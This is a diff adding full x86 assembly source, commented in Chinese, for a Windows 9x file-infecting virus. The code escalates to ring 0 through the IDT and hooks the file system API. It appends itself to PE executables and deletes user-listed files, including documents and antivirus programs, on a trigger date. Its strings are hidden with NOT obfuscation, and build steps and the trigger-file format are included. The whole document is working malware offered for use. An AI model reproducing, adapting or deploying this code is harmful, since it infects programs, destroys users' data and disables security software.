@@ -1,0 +1,668 @@
+;       Win32 CAW code 
+.386P
+.MODEL FLAT
+.CODE
+
+;DR0存放段地址(全局)
+;DR1存放零时变量(局部)
+;DR2存放文件修改标志(局部)
+;DR3未用
+
+NOTDATA_SIZE         = OFFSET CVSIZE-OFFSET NOTDATA ;变形数据大小
+CV_SIZE              = OFFSET CVSIZE-OFFSET START   ;病度大小 
+MYCODE_MEM_OFF       = 401000H
+                        
+;*****************************************
+;*PE Section 格式                        *
+;*****************************************
+     SECTION_NAME           =     00H
+     VIRTUAL_SIZE           =     08H
+     VIRTUAL_ADDRESS        =     0CH
+     PHYS_SIZE              =     10H
+     PHYS_ADDRESS           =     14H
+     CHARACTERISTICS        =     24H
+;*****************************************
+;*PE Section 格式                        *
+;*****************************************
+
+
+;*****************************************
+;*引导块开始                             *
+;*****************************************
+START :PUSHAD
+       MOV ESI,EAX
+
+       PUSH EAX
+       SIDT FWORD PTR [ESP-2]
+       POP EBX
+
+       ADD EBX,3*8H
+       MOV EBP,[EBX+4]
+       MOV  BP,[EBX]
+       MOV EAX,EBP
+
+       JMP NEXTCODE1
+       DW  87C1H         ;迷惑静态反编译
+NEXTCODE1:
+       SHR EAX,18H
+       OR  AL,AL
+       JZ STAYED_IN_MEM
+
+       CLI
+       LEA EAX,ESI[RING0-START]
+       MOV [EBX],AX
+       SHR EAX,10H
+       MOV [EBX+6],AX
+       STI
+       INT 3H
+STAYED_IN_MEM:
+       POPAD
+       MOV EAX,NOT(MYCODE_MEM_OFF+OFFSET AGAIN-OFFSET START)
+OLD_EP = DWORD PTR $-4
+       NOT EAX
+AGAIN: JMP EAX
+       DW    87C7H
+RING0:  XOR   ECX,ECX
+        PUSH  0FH
+        PUSH  ECX
+        PUSH  0FFH
+        PUSH  ECX
+        PUSH  ECX
+        PUSH  ECX
+        PUSH  01H
+        PUSH  02H
+INT20_01_53:
+        INT  20H     
+        DW   53H
+        DW   01H
+        ADD  ESP,20H   
+
+        OR  EDX,EDX
+        JNZ ENOUGH_MEM
+        CLI
+        MOV [EBX],BP
+        SHR EBP,10H
+        MOV [EBX+6],BP
+        STI
+        IRETD
+        DW    87C7H
+ENOUGH_MEM:
+        MOV EDI,EDX
+        MOV ECX,CV_SIZE
+        CLD
+        REP MOVSB
+        MOV EDI,EDX
+
+        LEA EAX,EDI[NEWAPI-START]
+        PUSH EAX
+INT20_40_67:
+        INT 20H
+        DW  0067H
+        DW  0040H        ;InstallFileSystemApiHook
+        ADD ESP,4
+
+        MOV EDI[OLDAPI-START],EAX
+        MOV EDI[DELTA-START],EDI
+
+        MOV AX,20CDH
+        MOV EDI[INT20_01_53-START  ],AX                    ;PageAlloc
+        MOV EDI[INT20_01_53-START+2],DWORD PTR 00010053H
+        MOV EDI[INT20_40_32-START  ],AX                    ;IFSMgr_FileIO
+        MOV EDI[INT20_40_32-START+2],DWORD PTR 00400032H
+        MOV EDI[INT20_40_41-START  ],AX                    ;BcsToUni
+        MOV EDI[INT20_40_41-START+2],DWORD PTR 00400041H
+        MOV EDI[ENTERF-START],BYTE PTR 0
+
+        MOV ECX,NOTDATA_SIZE
+        ADD EDI,OFFSET NOTDATA - OFFSET START
+NOT_LOOP:
+        MOV AL,[EDI]
+        NOT AL
+        MOV EDI[DATA-NOTDATA],AL
+        INC EDI
+        DEC ECX
+        JECXZ NOT_END
+        JMP NOT_LOOP
+        DW    87C7H
+NOT_END:
+        IRETD
+;*****************************************
+;*引导块结束                              *
+;*****************************************
+
+;*****************************************
+;*文件系统挂钩函数SystemFileApiHook开始    *
+;*****************************************
+;-------进入处理--------------------------
+NEWAPI: PUSHAD
+        MOV EDI,0
+DELTA   = DWORD PTR $-4
+        MOV DR0,EDI
+        MOV  EBX,ESP
+
+        CMP EDI[ENTERF-START],BYTE PTR 0
+        JZ  I_AM_FREE
+         
+        PUSH DWORD PTR [EBX+20H+4H+14H]
+        CALL [EBX+20H+4H]
+        POP  ECX
+        MOV  [EBX+1CH],EAX
+
+        CMP DWORD PTR [EBX+20H+4H+04H],24H
+        JNZ QUITFSH
+        MOV EAX,[ECX+28H]
+        MOV EDI[FILEMODI-START],EAX
+QUITFSH:POPAD
+        RET
+        DW    87C7H
+I_AM_FREE:
+        CMP DWORD PTR [EBX+20H+4H+04H],24H
+        JNZ CALLOLDAPI
+        MOV EDI[ENTERF-START],BYTE PTR 1
+                
+; ------进入处理--------------------------
+        LEA  ESI,EDI[BUFFER-START]
+        MOV  EAX,[EBX+20H+4H+8H]
+        CMP  AL,0FFH
+        JZ   JPDRV
+        ADD  AL,40H
+        MOV  [ESI],AL
+        INC  ESI
+        MOV  [ESI],BYTE PTR ':'
+        INC  ESI
+JPDRV:  SUB  EAX,EAX
+        PUSH EAX
+        PUSH 0FFH
+        MOV  EBX,[EBX+20H+4+14H]
+        MOV  EAX,[EBX+0CH]
+        INC  EAX              ;ADD  EAX,4
+        INC  EAX
+        INC  EAX
+        INC  EAX
+
+        PUSH EAX
+        PUSH ESI
+INT20_40_41:
+        INT  20H
+        DW   0041H
+        DW   0040H
+        ADD  ESP,10H
+        INC EAX        
+        INC EAX
+        DEC ESI
+        DEC ESI
+                 
+        ADD EDI,OFFSET FILENAME-OFFSET START
+        MOV ECX,EAX
+        CLD
+        REP MOVSB
+        MOV [ESI],CL
+        MOV [EDI],CL
+        MOV EDI,DR0
+;-----------读取DAW并删除其指定文件---------
+GETDAWFILE:
+        MOV DR1,ESI         ;被操作文件名尾指针->DR1
+        MOV AX,0D500H
+        XOR EBX,EBX
+        XOR ECX,ECX
+        XOR EDX,EDX      ;MOV EDX,1
+        INC EDX
+        LEA ESI,EDI[COM_FN-START]
+        CALL INT20_40_32
+        JC FIND_NOCOM
+ 
+        MOV EBX,EAX
+        MOV  AX,0D800H
+        CALL INT20_40_32
+        JC CLOSE_GETCOM
+
+        MOV ECX,EAX
+        XOR EDX,EDX
+        LEA ESI,EDI[COMLINE-START]
+        CALL READFILE
+CLOSE_GETCOM:
+        MOV  AX,0D700H
+        CALL INT20_40_32
+
+        CLD
+        XCHG ESI,EDI           ;ESI->@  EDI->COMLINE
+        MOV  AX,000DH
+REPL_CON:
+        REPNZ SCASB
+        JECXZ EXIT_REPL_LOOP
+        DEC EDI
+        INC ECX
+        MOV [EDI],AH
+        JMP  REPL_CON
+        DW    87C7H
+EXIT_REPL_LOOP:
+        XCHG EDI,ESI           ;EDI->@ ESI->COMLINE末
+
+        CMP [ESI-3],BYTE PTR '#'
+        JNZ FIND_NOCOM
+
+        MOV AL ,07H
+        OUT 70H,AL
+        IN  AL ,71H
+        MOV CL ,AL
+        MOV AL ,08H
+        OUT 70H,AL
+        IN  AL ,71H
+        MOV CH ,AL 
+
+        MOV AH,'0'
+
+        MOV DX,[ESI-7]     ;读月
+        SUB DH,AH
+        SUB DL,AH
+        SHL DL,4
+        ADD DL,DH
+        OR  DL,DL
+        JZ  IGNOREMONTH
+        CMP DL,CH
+        JNZ CMP_EXE
+IGNOREMONTH:
+        MOV DX,[ESI-5]     ;读日
+        SUB DH,AH
+        SUB DL,AH
+        SHL DL,4
+        ADD DL,DH
+        OR  DL,DL
+        JZ  FIND_NOCOM
+        CMP DL,CL
+        JNZ CMP_EXE
+FIND_NOCOM:
+        MOV ESI,DR1
+        ADD EDI,OFFSET COMLINE-OFFSET START
+
+        XOR AL ,AL
+        OUT 70H,AL
+        IN  AL ,71H
+        MOV BH,AL
+        AND BH,00011111B          ;比较秒(BH=SEC*2)
+        XOR  BL,BL
+        XOR  EDX,EDX
+        DEC  EDI
+        DEC  EDI
+DELF_LOOP:
+        NOT BL
+        ADD EDI,EDX
+        INC EDI
+        INC EDI
+        CMP [EDI],BYTE PTR 0
+        JZ  CMP_EXE
+        CALL GET_STL
+        MOV EDX,ECX
+        PUSH ESI
+        SUB ESI,EDX
+        CALL CMP_ST
+        POP  ESI
+        JNZ DELF_LOOP
+        OR  BL,BL
+        JNZ DEL_IT_EVERYTIME
+        OR  BH,BH
+        JNZ DELF_LOOP
+DEL_IT_EVERYTIME:
+        CALL DEL_FILE
+        JMP EXITAPI
+        DW    87C7H
+;-----------读取DAW并删除其指定文件---------
+CMP_EXE:
+        MOV ESI,DR1
+        MOV  EAX,NOT('EXE.')              ;是否为EXE文件
+        NOT  EAX
+        CMP  [ESI-4],EAX
+        JNZ  EXITAPI
+        CALL INF_EXE
+;-------退出处理--------------------------
+EXITAPI:MOV  EDI,DR0
+        MOV  EDI[ENTERF-START],BYTE PTR 0
+CALLOLDAPI:
+        POPAD
+        MOV  EAX,0
+OLDAPI  =  DWORD PTR $-4
+        JMP [EAX]
+
+;-------退出处理--------------------------
+;*****************************************
+;*文件系统挂钩函数SystemFileApiHook结束     *
+;*****************************************
+;-------比较字符串 ---------------
+CMP_ST: PUSH ESI                   ;进口:ESI->字符串1   EDI->字符串2
+        PUSH EDI
+        CLD
+CMP_ST_LOOP:
+        REPZ CMPSB
+        JECXZ NOCHAR
+        CMP [EDI-1],BYTE PTR '?'
+        JZ   CMP_ST_LOOP
+NOCHAR: POP EDI
+        POP ESI
+        OR ECX,ECX                 ;出口:相等->Z位置1   不相等->Z位置0
+        RET      
+;-------比较字符串----------------
+;-------取字符串长度--------------
+GET_STL:PUSH EAX                   ;进口:EDI->字符串
+        PUSH EDI
+        XOR ECX,ECX
+        DEC ECX
+        XOR AL,AL 
+        REPNZ SCASB
+        NOT ECX
+        DEC ECX
+        POP EDI
+        POP EAX
+        RET                        ;出口:ECX=字符串长度
+;-------取字符串长度--------------
+;-------删除一文件---------------
+DEL_FILE: MOV AX,4301H            ;进口:将该文件名放入FILENAME
+          XOR ECX,ECX
+          MOV ESI,DR0
+          ADD ESI,OFFSET FILENAME-OFFSET START
+          CALL INT20_40_32
+          JC DELF_EXIT
+          MOV AX,4100H
+          CALL INT20_40_32         ;出口:无
+DELF_EXIT:
+          RET
+;-------删除一文件---------------
+;-------感染EXE文件---------------
+INF_EXE:        
+        MOV EDI,DR0        
+        XOR EAX,EAX
+        MOV DR2,EAX
+
+        MOV AX,4300H
+        LEA ESI,EDI[FILENAME-START]
+        CALL INT20_40_32
+        JC  EXIT_INF_EXE
+        MOV DR1,ECX
+
+        MOV AX,4301H
+        XOR ECX,ECX
+        CALL INT20_40_32
+        JC  EXIT_INF_EXE
+        
+        MOV AX,0D500H
+        SUB ECX,ECX
+        XOR EDX,EDX   ;MOV EDX,01H
+        INC EDX
+        MOV EBX,EDX   ;MOV EBX,02H
+        INC EBX
+        LEA ESI,EDI[FILENAME-START]
+        CALL INT20_40_32
+        JC  RET_ATTRIB
+        MOV EBX,EAX                   
+       
+        XOR ECX,ECX   ;MOV ECX,04H
+        MOV CL ,04H
+        XOR EDX,EDX   ;MOV EDX,3CH
+        MOV DL ,3CH
+
+        LEA ESI,EDI[PEFILE_PTR-START]
+        CALL READFILE
+        JC  NFIND
+
+        XOR ECX,ECX   ;MOV ECX,60H
+        MOV CL ,60H
+        MOV EDX,EDI[PEFILE_PTR-START]        
+        LEA ESI,EDI[BUFFER-START]
+        CALL READFILE
+         
+        MOV AX,NOT('EP')                   ;判断是否为PE文件
+        NOT AX
+        CMP [ESI],AX
+        JNZ NFIND
+
+        MOV EAX,[ESI+28H]
+        MOV EDI[OLD_EP-START],EAX          ;读 OLD_EP
+         
+        MOV EAX,[ESI+34H]
+        MOV EDI[IMAGEBASE-START],EAX       ;读 IMAGEBASE
+        ADD EDI[OLD_EP-START],EAX
+        NOT DWORD PTR EDI[OLD_EP-START]
+        
+        MOV EAX,[ESI+3CH]                  ;读 FILEALIGNMENT
+        MOV EDI[FILEALIGNMENT-START],EAX
+
+        XOR EAX,EAX
+        MOV AX,[ESI+06H]                   ;读 SECTION_N
+        MOV EDI[SECTION_N-START],AX
+
+        XOR ECX,ECX   ;MOV ECX,28H         ;GET SECTION_SIZE
+        MOV CL ,28H
+        MUL ECX
+        MOV ECX,EAX         
+        MOV EDI[SECTION_SIZE-START],ECX
+
+        XOR EDX,EDX
+        ADD DX,[ESI+14H]                  
+        ADD EDX,18H
+        ADD EDX,EDI[PEFILE_PTR-START]     ;GET SECTION_POSITION
+        MOV EDI[SFILE_PTR-START],EDX
+
+        LEA ESI,EDI[BUFFER-START]         ;读取Sections
+        CALL READFILE
+             
+        MOV EDX,[ESI+3CH]                 ;如果是ZIP自解压则不感染
+        MOV ECX,4                         ;ZIP自解压文件的标志是SECTION_2
+        LEA ESI,EDI[BUFFER-START+4F0H]    ;的前4字节是否为0xFFFFFFFF
+        CALL READFILE
+        MOV EDX,[ESI]
+        INC EDX
+        OR  EDX,EDX
+        JZ  NFIND
+
+        LEA ESI,EDI[BUFFER-START]
+        MOV AX,EDI[SECTION_N-START]
+SECT_LOOP:
+        OR  AX,AX
+        JZ  TEST_LAST_SECTION
+        CMP [ESI+VIRTUAL_SIZE],DWORD PTR 0
+        JZ  PHYS_B_VIRS
+        MOV EDX,[ESI+PHYS_SIZE]
+        SUB EDX,[ESI+VIRTUAL_SIZE]
+        JS  PHYS_B_VIRS
+        CMP EDX,CV_SIZE
+        JA  FINDSECTION
+PHYS_B_VIRS:
+        DEC AX
+        ADD ESI,28H
+        JMP SECT_LOOP
+        DW    87C7H
+TEST_LAST_SECTION:
+        SUB ESI,28H
+        MOV AX,0D800H
+        CALL INT20_40_32
+
+        MOV EDX,[ESI+PHYS_ADDRESS]
+        ADD EDX,[ESI+PHYS_SIZE   ]
+        CMP EAX,EDX
+        JNZ NFIND
+
+        MOV EDX,[ESI+VIRTUAL_SIZE]
+        OR  EDX,EDX
+        JZ  NFIND
+        MOV EAX,[ESI+PHYS_SIZE]
+        CMP EAX,EDX
+        JBE NFIND
+
+        XOR EDX,EDX
+        MOV EAX,CV_SIZE
+        MOV ECX,EDI[FILEALIGNMENT-START]
+        DIV ECX
+        INC EAX
+        MUL ECX
+        PUSH EAX        
+
+        ADD [ESI+PHYS_SIZE],EAX
+        MOV EAX,[ESI+VIRTUAL_ADDRESS]
+        ADD EAX,[ESI+PHYS_SIZE]
+        MOV EDI[SIZEOFIMAGE-START],EAX
+             
+        
+        PUSH ESI
+        MOV  EDX,EDI[PEFILE_PTR-START]
+        ADD  EDX,50H
+        MOV  ECX,4
+        LEA  ESI,EDI[SIZEOFIMAGE-START]
+        CALL WRITEFILE
+        XOR EAX,EAX
+        INC EAX
+        MOV DR2,EAX
+        POP  ESI
+        POP EAX
+        JC  RET_ATTRIB        
+
+        MOV  EDX,[ESI+PHYS_SIZE]
+        SUB  EDX,EAX
+        JMP WRITE2FILE
+        DW    87C7H
+FINDSECTION:
+        MOV EDX,[ESI+PHYS_SIZE]
+        SUB EDX,CV_SIZE
+               
+WRITE2FILE:
+        MOV EAX,[ESI+PHYS_SIZE]
+        MOV [ESI+VIRTUAL_SIZE],EAX
+        MOV [ESI+CHARACTERISTICS],DWORD PTR 0E0000040H ;(0E0000040H)数据可读可写可执行
+
+        MOV EAX,[ESI+VIRTUAL_ADDRESS]
+        ADD EAX,EDX
+        MOV EDI[NEW_EP-START],EAX
+         
+        ADD EDX,[ESI+PHYS_ADDRESS]
+        MOV ECX,CV_SIZE
+        MOV ESI,EDI                      ;写自身
+        CALL WRITEFILE
+        JC  RET_ATTRIB        
+
+        MOV ECX,EDI[SECTION_SIZE-START]
+        MOV EDX,EDI[SFILE_PTR-START]     ;写 SECTION
+        LEA ESI,EDI[BUFFER-START]
+        CALL WRITEFILE
+       
+        XOR ECX,ECX    ;MOV ECX,4
+        MOV  CL,04H
+        MOV EDX,EDI[PEFILE_PTR-START]    ;写 NEW_EP
+        ADD EDX,28H
+        LEA ESI,EDI[NEW_EP-START]
+        CALL WRITEFILE
+
+NFIND:  MOV AX,0D700H
+        CALL INT20_40_32
+
+RET_ATTRIB:
+        MOV AX,4301H
+        LEA ESI,EDI[FILENAME-START]
+        MOV ECX,DR1
+        CALL INT20_40_32
+
+        MOV EAX,DR2                      ;判断是否文件已被修改
+        OR  EAX,EAX
+        JNZ EXIT_INF_EXE
+
+        MOV AX,4303H
+        MOV ECX,EDI[FILEMODI-START  ]    ;改回文件修改日期
+        MOV EDI,EDI[FILEMODI-START+2]
+        CALL INT20_40_32
+
+EXIT_INF_EXE:
+        RET
+;-------感染EXE文件--------------
+;--------------------------------
+WRITEFILE:
+         MOV AX,0D601H
+         JMP INT20_40_32
+         DW    87C7H
+READFILE:MOV AX,0D600H
+INT20_40_32:
+         INT 20H 
+         DW  32H
+         DW  40H
+         RET
+;--------------------------------
+NOTDATA:
+
+NOT_COM_FN   DB NOT'C',NOT':',NOT'\',NOT'D',NOT'A',NOT'W',NOT(0)
+
+NOT_COMLINE  DB NOT'A',NOT'V',NOT'.',NOT'E',NOT'X',NOT'E',NOT(0),NOT(0)
+             DB NOT'W',NOT'O',NOT'R',NOT'D',NOT'.',NOT'E',NOT'X',NOT'E',NOT(0),NOT(0)
+
+             DB NOT'M',NOT'O',NOT'N',NOT'.',NOT'E',NOT'X',NOT'E',NOT(0),NOT(0)
+             DB NOT'.',NOT'D',NOT'O',NOT'C',NOT(0),NOT(0)
+
+             DB NOT'M',NOT'O',NOT'N',NOT'?',NOT'?',NOT'.',NOT'E',NOT'X',NOT'E',NOT(0),NOT(0)
+             DB NOT'.',NOT'D',NOT'P',NOT'R',NOT(0),NOT(0)
+
+             DB NOT'M',NOT'O',NOT'N',NOT'?',NOT'?',NOT'?',NOT'?',NOT'.',NOT'E',NOT'X',NOT'E',NOT(0),NOT(0)
+             DB NOT'.',NOT'J',NOT'P',NOT'G',NOT(0),NOT(0)
+
+             DB NOT'V',NOT'S',NOT'C',NOT'A',NOT'N',NOT'?',NOT'?',NOT'.',NOT'E',NOT'X',NOT'E',NOT(0),NOT(0)
+             DB NOT'.',NOT'M',NOT'P',NOT'3',NOT(0),NOT(0)
+
+             DB NOT('K'),NOT('V'),NOT('?'),NOT('0'),NOT('0'),NOT('.'),NOT('?'),NOT('?'),NOT('?'),NOT(0)
+             DB NOT'.',NOT'P',NOT'A',NOT'S',NOT(0),NOT(0)
+
+             DB NOT(0),NOT(0)
+
+             DB NOT('D'),NOT('o'),NOT('n'),NOT(27H),NOT('t'),NOT(' '),NOT('k'),NOT('i'),NOT('l')
+             DB NOT('l'),NOT(' '),NOT('m'),NOT('e'),NOT('!'),NOT('I'),NOT(' '),NOT('a'),NOT('m')
+             DB NOT(' '),NOT('a'),NOT(' '),NOT('g'),NOT('o'),NOT('o'),NOT('d'),NOT(' '),NOT('v')
+             DB NOT('i'),NOT('r'),NOT('u'),NOT('s'),NOT('!')
+
+CVSIZE:
+ENTERF               DB    0     ;进入标志
+SECTION_N            DW    0     ;块个数
+SECTION_SIZE         DD    0     ;块大小
+PEFILE_PTR           DD    0     ;PE文件指针  
+SFILE_PTR            DD    0     ;SECTION文件指针
+FILEALIGNMENT        DD    0     ;文件对齐因子
+IMAGEBASE            DD    0     ;基地址
+NEW_EP               DD    0     ;新入口
+SIZEOFIMAGE          DD    0     ;IMAGE大小
+FILEMODI             DD    0     ;文件修改日期
+
+FILENAME             DB 100H DUP(0) ;被拦截的文件名
+BUFFER               DB 500H DUP(0) ;缓冲区
+
+DATA:
+COM_FN               DB    'C:\DAW',0
+COMLINE              DB 0
+
+         END START
+
+;***********makefile内容*********************                
+;.asm.obj:                                  *
+;  tasm32 cvaw.asm cvaw.obj cvaw.lst        *
+;cvaw.exe: cvaw.obj                         *
+;  tlink32 /Tpe cvaw.obj,cvaw.exe,,,cvaw.def*
+;***********makefile内容*********************
+
+;编译需要tasm32.exe tlink32.exe make.exe
+
+;***********C:\DAW文件内容****************
+;文件1(回车)                             *
+;文件2(回车)                             *
+;    .                                   *
+;    .                                   *
+;    .                                   *
+;文件N(回车)                             *
+;(回车)                                  *
+;(回车)                                  *
+;nnnn#(回车)                             *
+;                                        *
+;回车的ASCII码为0D,0A                    *
+;                                        *
+;cvaw识别文件从末尾开始比较              *
+;如:WINWORD.EXE符合WORD.EXE              *
+;要删*.DOC就打.DOC                       *
+;N别太大,会溢出                          *
+;                                        *
+;nnnn为发作日期                          *
+;如:0723#(7月23日)                       *
+;                                        *
+;一定要严格遵守回车的位置和数量,否则无效 *
+;***********C:\DAW文件内容****************
+
+
